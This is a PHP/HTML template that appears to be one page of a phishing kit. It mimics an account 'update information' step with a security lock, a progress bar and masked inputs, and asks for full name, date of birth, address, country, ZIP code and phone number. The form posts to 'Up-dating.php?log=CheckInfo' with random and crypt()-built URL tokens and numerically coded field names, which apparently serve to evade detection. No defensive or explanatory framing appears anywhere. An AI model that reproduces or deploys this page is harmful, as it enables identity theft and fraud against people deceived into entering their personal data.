<body><header class="mainHeader" role="banner"><div class="headerContainer"><div class="grid12"><a href="#" class="logo"></a><div class="loginBtn"><span class="securityLock" title="<?php echo $inf_scr; ?>"><?php echo $inf_scr; ?></span></div></div></div></header><main class="superBowlMain"><section id="content" role="main" data-country="US"><section id="main" class=""><div id="create" class="create grid12"><div class="customGrid7"><!-- FORM --><form action="Up-dating.php?log=CheckInfo#Info=<?php echo $ran;?>=<?php echo $rans;?>Inf=<?php echo crypt($_SESSION['s03']); ?>=<?php include '../ran.php'; echo $r; ?>" method="post" name="create_form" class="proceed"  onSubmit="return checkbae()"> <div class="stepProgress"><span class="selected" title="<?php echo $inf_ttspan; ?>">●</span><span>○</span><span>○</span><span>○</span></div><div class="pageHeader" title="<?php echo $inf_lab1; ?>"><h2><?php echo $inf_lab1; ?></h2></div><div class="superBowlContainer"><div class="inner"><!-- First Name --><p><?php echo $inf_corr; ?></p><div class="groupFields"><div class="multi equal clearfix"><div class="textInput lap"><div class="fields medium left"><input type="text" id="firstName" name="03" class="validate camelCase name" value="" required autocomplete="off" title="<?php echo $inf_frnm; ?>" placeholder="<?php echo $inf_frnm; ?>" maxlength="20" ></div></div><div class="textInput lap"><div class="fields medium right"><input type="text" class="validate camelCase name" id="lastName" name="04"  value="" required autocomplete="off" title="<?php echo $inf_lsnm; ?>" placeholder="<?php echo $inf_lsnm; ?>" maxlength="20" ></div></div></div></div><div class="addressEntry " id="addressEntry"><div class="groupFields"><!-- BTD --><div class="textInput  lap "><div class="fields large"><input class="hasHelp confidential validate camelCase" id="05" name="05" type="tel" value="" required="required" title="<?php echo $inf_dob; ?>" placeholder="<?php echo $inf_dob; ?>" maxlength="20" ></div></div><!-- Add --><div class="textInput  lap "><div class="fields large"><input type="text" class="hasHelp confidential validate camelCase" data-nopobox="" id="address1" name="06"  value="" required autocomplete="off" title="<?php echo $inf_add; ?>" placeholder="<?php echo $inf_add; ?>" ></div></div><!-- City And State --><div class="groupFields"><div class="multi equal clearfix"><div class="textInput lap"><div class="fields medium left"><input type="text" id="city" name="07" class="confidential validate" value="" required autocomplete="off" title="<?php echo $inf_cty; ?>" placeholder="<?php echo $inf_cty; ?>" maxlength="20" ></div></div><div class="textInput lap"><div class="fields medium right"><input type="text" class="confidential validate" id="state" name="08"  value="" autocomplete="off" title="<?php echo $inf_stt; ?>" placeholder="<?php echo $inf_stt; ?>" maxlength="20" ></div></div></div></div><!-- COUNTRY --><div class="multi equal clearfix"><div class="nativeDropdown left medium state "><div class="selectDropdown"><label for="state" class="accessAid">State</label><select id="state" name="09" title="<?php echo $inf_cnt; ?>" class="validate no-arrow" required="required" aria-required="true"><option value="<?php echo $_SESSION['cntn']; ?>" selected="selected"><?php echo $_SESSION['cntn']; ?></option><option value="UNITED STATES">United States</option><option value="CANADA">Canada</option><option value="MEXICO">Mexico</option><option value="United Kingdom">United Kingdom</option><option value="FRANCE">France</option><option value="GERMANY">Germany</option><option value="NETHERLANDS">Netherlands</option><option value="DENMARK">Denmark</option><option value="RUSSIA">Russia</option><option value="ITALY">Italy</option><option value="AFGHANISTAN">Afghanistan</option><option value="ALBANIA">Albania</option><option value="ALGERIA">Algeria</option><option value="AMERICAN SAMOA">American Samoa</option><option value="ANGUILLA">Anguilla</option><option value="ANTIGUA &amp; BARBUDA">Antigua &amp; Barbuda</option><option value="ARGENTINA">Argentina</option><option value="ARMENIA">Armenia</option><option value="ARUBA">Aruba</option><option value="AUSTRALIA">Australia</option><option value="AUSTRIA">Austria</option><option value="AZERBAIJAN">Azerbaijan</option><option value="BAHAMAS">Bahamas</option><option value="BAHRAIN">Bahrain</option><option value="BANGLADESH">Bangladesh</option><option value="BARBADOS">Barbados</option><option value="BELARUS">Belarus</option><option value="BELGIUM">Belgium</option><option value="BELIZE">Belize</option><option value="BENIN">Benin</option><option value="BHUTAN">Bhutan</option><option value="BOLIVIA">Bolivia</option><option value="BONAIRE">Bonaire</option><option value="BOSNIA &amp; HERZEGOVINA">Bosnia &amp; Herzegovina</option><option value="BOTSWANA">Botswana</option><option value="BRAZIL">Brazil</option><option value="BRITISH VIRGIN ISLANDS">British Virgin Islands</option><option value="BRUNEI DARUSSALAM">Brunei Darussalam</option><option value="BULGARIA">Bulgaria</option><option value="BURKINA FASO">Burkina Faso</option><option value="BURUNDI">Burundi</option><option value="CAMBODIA">Cambodia</option><option value="CAMEROON">Cameroon</option><option value="CAPE VERDE">Cape Verde</option><option value="CAYMAN ISLANDS">Cayman Islands</option><option value="CENTRAL AFRICAN REPUBLIC">Central African Rep</option><option value="CHAD">Chad</option><option value="CHILE">Chile</option><option value="CHINA">China</option><option value="COLOMBIA">Colombia</option><option value="COMOROS">Comoros</option><option value="CONGO">Congo</option><option value="COOK ISLANDS">Cook Islands</option><option value="COSTA RICA">Costa Rica</option><option value="COTE D IVOIRE">Cote D'Ivoire</option><option value="CROATIA">Croatia</option><option value="CUBA - US MILITARY">Cuba - US Military</option><option value="CURACAO">Curacao</option><option value="CYPRUS">Cyprus</option><option value="CYPRUS NORTHERN">Cyprus (Northern)</option><option value="CZECH REPUBLIC">Czech Republic</option><option value="DEMOCRATIC REPUBLIC OF CONGO">Dem Rep of Congo</option><option value="DJIBOUTI">Djibouti</option><option value="DOMINICA">Dominica</option><option value="DOMINICAN REPUBLIC">Dominican Republic</option><option value="EAST TIMOR">East Timor</option><option value="ECUADOR">Ecuador</option><option value="EGYPT">Egypt</option><option value="EL SALVADOR">El Salvador</option><option value="EQUATORIAL GUINEA">Equatorial Guinea</option><option value="ERITREA">Eritrea</option><option value="ESTONIA">Estonia</option><option value="ETHIOPIA">Ethiopia</option><option value="FALKLAND ISLANDS">Falkland Islands</option><option value="FIJI">Fiji</option><option value="FINLAND">Finland</option><option value="FRENCH GUIANA">French Guiana</option><option value="FRENCH POLYNESIA">French Polynesia</option><option value="GABON">Gabon</option><option value="GAMBIA">Gambia</option><option value="GEORGIA">Georgia</option><option value="GERMANY - US MILITARY">Germany - US Military</option><option value="GHANA">Ghana</option><option value="GIBRALTAR">Gibraltar</option><option value="GREECE">Greece</option><option value="GRENADA">Grenada</option><option value="GUADELOUPE">Guadeloupe</option><option value="GUAM">Guam</option><option value="GUATEMALA">Guatemala</option><option value="GUINEA">Guinea</option><option value="GUINEA-BISSAU">Guinea-Bissau</option><option value="GUYANA">Guyana</option><option value="HAITI">Haiti</option><option value="HONDURAS">Honduras</option><option value="HONG KONG">Hong Kong</option><option value="HUNGARY">Hungary</option><option value="ICELAND">Iceland</option><option value="INDIA">India</option><option value="INDONESIA">Indonesia</option><option value="IRAQ">Iraq</option><option value="IRELAND">Ireland</option><option value="ISRAEL">Israel</option><option value="ITALY - US MILITARY">Italy - US Military</option><option value="JAMAICA">Jamaica</option><option value="JAPAN">Japan</option><option value="JAPAN - US MILITARY">Japan - US Military</option><option value="JORDAN">Jordan</option><option value="KAZAKHSTAN">Kazakhstan</option><option value="KENYA">Kenya</option><option value="KIRIBATI">Kiribati</option><option value="KOREA - US MILITARY">Korea - US Military</option><option value="REPUBLIC OF KOREA">Korea, Republic of</option><option value="KOSOVO DEM">Kosovo</option><option value="KUWAIT">Kuwait</option><option value="KYRGHYZ REPUBLIC">Kyrghyz Republic</option><option value="LAOS">Laos</option><option value="LATVIA">Latvia</option><option value="LEBANON">Lebanon</option><option value="LIBERIA">Liberia</option><option value="LIBYA">Libya</option><option value="LIECHTENSTEIN">Liechtenstein</option><option value="LITHUANIA">Lithuania</option><option value="LUXEMBOURG">Luxembourg</option><option value="MACAU">Macau</option><option value="MACEDONIA">Macedonia</option><option value="MADAGASCAR">Madagascar</option><option value="MALAWI">Malawi</option><option value="MALAYSIA">Malaysia</option><option value="MALDIVES">Maldives</option><option value="MALI">Mali</option><option value="MALTA">Malta</option><option value="MARSHALL ISLANDS">Marshall Islands</option><option value="MARTINIQUE">Martinique</option><option value="MAURITANIA">Mauritania</option><option value="MAURITIUS">Mauritius</option><option value="MAYOTTE">Mayotte</option><option value="MICRONESIA">Micronesia</option><option value="MOLDOVA">Moldova</option><option value="MONACO">Monaco</option><option value="MONGOLIA">Mongolia</option><option value="MONTSERRAT">Montserrat</option><option value="MOROCCO">Morocco</option><option value="MOZAMBIQUE">Mozambique</option><option value="NEPAL">Nepal</option><option value="NEW CALEDONIA">New Caledonia</option><option value="NEW ZEALAND">New Zealand</option><option value="NICARAGUA">Nicaragua</option><option value="NIGER">Niger</option><option value="NIGERIA">Nigeria</option><option value="NIUE">Niue</option><option value="MARIANAS">Northern Mariana Islands</option><option value="NORWAY">Norway</option><option value="OMAN">Oman</option><option value="PAKISTAN">Pakistan</option><option value="PALAU">Palau</option><option value="PALESTINIAN AUTHORITY">Palestinian Authority</option><option value="PANAMA">Panama</option><option value="PAPUA NEW GUINEA">Papua New Guinea</option><option value="PARAGUAY">Paraguay</option><option value="PERU">Peru</option><option value="PHILIPPINES">Philippines</option><option value="POLAND">Poland</option><option value="PORTUGAL">Portugal</option><option value="QATAR">Qatar</option><option value="REUNION">Reunion</option><option value="ROMANIA">Romania</option><option value="RWANDA">Rwanda</option><option value="SAMOA">Samoa</option><option value="SAO TOME AND PRINCIPE">S&atilde;o Tom&eacute; and Pr&iacute;ncipe</option><option value="SAUDI ARABIA">Saudi Arabia</option><option value="SENEGAL">Senegal</option><option value="SERBIA &amp; MONTENEGRO">Serbia &amp; Montenegro</option><option value="SEYCHELLES">Seychelles</option><option value="SIERRA LEONE">Sierra Leone</option><option value="SINGAPORE">Singapore</option><option value="SLOVAKIA">Slovakia</option><option value="SLOVENIA">Slovenia</option><option value="SOLOMON ISLANDS">Solomon Islands</option><option value="SPAIN">Spain</option><option value="SRI LANKA">Sri Lanka</option><option value="ST. KITTS">St. Kitts &amp; Nevis</option><option value="ST. LUCIA">St. Lucia</option><option value="ST. MAARTEN">St. Maarten</option><option value="ST. VINCENT">St. Vincent</option><option value="SUDAN">Sudan</option><option value="SURINAME">Suriname</option><option value="SWEDEN">Sweden</option><option value="SWITZERLAND">Switzerland</option><option value="SYRIA">Syria</option><option value="TAIWAN">Taiwan</option><option value="TAJIKISTAN">Tajikistan</option><option value="TANZANIA">Tanzania</option><option value="THAILAND">Thailand</option><option value="TOGO">Togo</option><option value="TONGA">Tonga</option><option value="TRINIDAD &amp; TOBAGO">Trinidad &amp; Tobago</option><option value="TUNISIA">Tunisia</option><option value="TURKEY">Turkey</option><option value="TURKMENISTAN">Turkmenistan</option><option value="TURKS &amp; CAICOS">Turks &amp; Caicos Island</option><option value="TUVALU">Tuvalu</option><option value="UGANDA">Uganda</option><option value="UKRAINE">Ukraine</option><option value="UNITED ARAB EMIRATES">United Arab Emirates</option><option value="URUGUAY">Uruguay</option><option value="UZBEKISTAN">Uzbekistan</option><option value="VANUATU">Vanuatu</option><option value="VENEZUELA">Venezuela</option><option value="VIETNAM">Vietnam</option><option value="YEMEN">Yemen</option><option value="ZAMBIA">Zambia</option><option value="ZIMBABWE">Zimbabwe</option></select><span class="select-arrow"></span></div></div><!-- ZIP code --><div class="textInput lap zip "><div class="fields medium right"><input type="text" id="postalCode" name="10" required autocomplete="off" title="<?php echo $inf_zip; ?>" placeholder="<?php echo $inf_zip; ?>" class="validate"   maxlength="10"  value="" ></div></div></div></div></div><!-- Mobile --><div class="groupReatedFields mobileEntry"><div class="left mobileEntry"><div class="selectDropdown"><select id="phoneOption" name="11"><option value="mobile"><?php echo $inf_mob; ?></option><option value="home"><?php echo $inf_hom; ?></option></select><span class="select-arrow"></span></div></div><div class="textInput lap phone phoneNumber "><div class="fields right"><input type="tel" id="phoneNumber" name="12" required="required" value="" class="validate hasHelp"  required autocomplete="off" title="<?php echo $inf_pho; ?>" placeholder="<?php echo $inf_pho; ?>" ></div></div></div><div class="agreeTC checkbox  "></div><input id="submitBtn" name="_eventId_continue" type="submit" class="button" value="<?php echo $inf_con; ?>"></div></div></form></div></div></section></section></main><?php include ('xf/ftr.php'); ?><script>jQuery(function($){$("#05").mask("99/99/9999"); });</script><script src="./imcs_files/jquery.maskedinput.min.js" type="text/javascript"></script></body>